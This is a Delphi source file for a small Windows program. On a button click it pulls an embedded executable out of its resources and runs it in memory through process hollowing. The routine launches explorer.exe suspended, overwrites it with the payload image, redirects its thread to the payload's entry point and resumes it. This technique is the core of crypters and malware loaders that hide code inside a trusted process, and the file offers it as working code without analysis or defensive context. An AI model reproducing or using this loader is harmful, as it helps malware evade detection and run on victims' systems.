unit Main_u;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, unitMemoryExecute, StdCtrls;

type
  TForm1 = class(TForm)
    Button1: TButton;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public                                          
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
{$R ACI.res}

function GetResData({var Size:integer; }pSectionName, pResourceType: pchar): pointer;
var
  ResourceLocation: HRSRC;
  ResourceHandle: THandle;
begin
  ResourceLocation := FindResource(hInstance, pSectionName, pResourceType);
  {Size := SizeOfResource(hInstance, ResourceLocation);}
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  Result := LockResource(ResourceHandle);
  If Result <> NIL Then
    FreeResource(ResourceHandle);
end;

procedure RunExeFromMemory(Image: Pointer; Params: String);
type
   PIMAGE_DOS_HEADER     = ^IMAGE_DOS_HEADER;
type
   PIMAGE_NT_HEADERS     = ^IMAGE_NT_HEADERS;
type
   PIMAGE_SECTION_HEADER = ^IMAGE_SECTION_HEADER;
var
PI             : TProcessInformation;
SI             : TStartupInfo;
HView, Mem     : Pointer;
Headers        : PIMAGE_NT_HEADERS;
Section        : PIMAGE_SECTION_HEADER;
Context        : TContext;
A, Size, Dummy : DWORD;
const
Mapping        : array[0..7] of DWORD = (PAGE_NOACCESS, PAGE_EXECUTE,
                                         PAGE_READONLY, PAGE_EXECUTE_READ,
                                         PAGE_READWRITE, PAGE_EXECUTE_READWRITE,
                                         PAGE_READWRITE, PAGE_EXECUTE_READWRITE);
begin
FillChar(SI, SizeOf(SI), 0);
SI.cb                := SizeOf(SI);
SI.dwFlags           := STARTF_USESHOWWINDOW;//
SI.wShowWindow       := 4;//
Win32Check(CreateProcess(nil, PChar(Format('explorer.exe %s', [Params])), nil, nil, False, CREATE_SUSPENDED, nil, nil, SI, PI));
try
try
Context.ContextFlags := CONTEXT_INTEGER;
Win32Check(GetThreadContext(PI.hThread, Context));
Win32Check(ReadProcessMemory(PI.hProcess, Pointer(Context.Ebx + 8), @HView, SizeOf(HView), Size)
                             and (Size = SizeOf(HView)));
Headers              := PIMAGE_NT_HEADERS(DWORD(Image) + DWORD(PIMAGE_DOS_HEADER(Image)._lfanew));
Mem                  := VirtualAllocEx(PI.hProcess, Pointer(Headers.OptionalHeader.ImageBase),
                                       Headers.OptionalHeader.SizeOfImage, MEM_RESERVE
                                       or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Win32Check(Mem <> nil);
Win32Check(WriteProcessMemory(PI.hProcess, Mem, Image, Headers.OptionalHeader.SizeOfHeaders, Size)
                              and (Headers.OptionalHeader.SizeOfHeaders = Size));
Section              := PIMAGE_SECTION_HEADER(Headers);
Inc(PIMAGE_NT_HEADERS(Section));
for A := 0 to Headers.FileHeader.NumberOfSections - 1 do
begin
if Section.SizeOfRawData > 0 then
begin
Win32Check(WriteProcessMemory(PI.hProcess, PChar(Mem) + Section.VirtualAddress, PChar(Image) +
           Section.PointerToRawData, Section.SizeOfRawData, Size) and (Section.SizeOfRawData = Size));
Win32Check(VirtualProtectEx(PI.hProcess, PChar(Mem) + Section.VirtualAddress, Section.SizeOfRawData,
           Mapping[Section.Characteristics shr 29], @Dummy));
end;
Inc(Section);
Application.ProcessMessages;
end;
Win32Check(WriteProcessMemory(PI.hProcess, Pointer(Context.Ebx + 8), @Mem, SizeOf(Mem), Size)
                              and (SizeOf(Mem) = Size));
Context.Eax          := DWORD(Mem) + Headers.OptionalHeader.AddressOfEntryPoint;
Win32Check(SetThreadContext(PI.hThread, Context));
Win32Check(ResumeThread(PI.hThread) <> $FFFFFFFF);
except
TerminateProcess(PI.hProcess, 0);//Result
raise;
end;
finally
CloseHandle(PI.hProcess);
CloseHandle(PI.hThread);
end;
end;

procedure TForm1.Button1Click(Sender: TObject);
var A:Pointer;
    {Size:Integer;}
    {r:TResourceStream;
    B:Array [0..259346] of byte;  }
begin
  a:=GetResData({Size,}'ACI','ACI_PE');
  RunExeFromMemory(a,'');
  {R:=TResourceStream.Create(hInstance,'ACI','ACI_PE');
  //setlength(b,r.size+100);
  r.ReadBuffer(B,r.Size);}
  {if not MemoryExecute(a,ParamStr(0),'',True) then
    showmessage('Fail');
  showmessage('Hello'); }
//  FreeMem(@b);
end;

end.
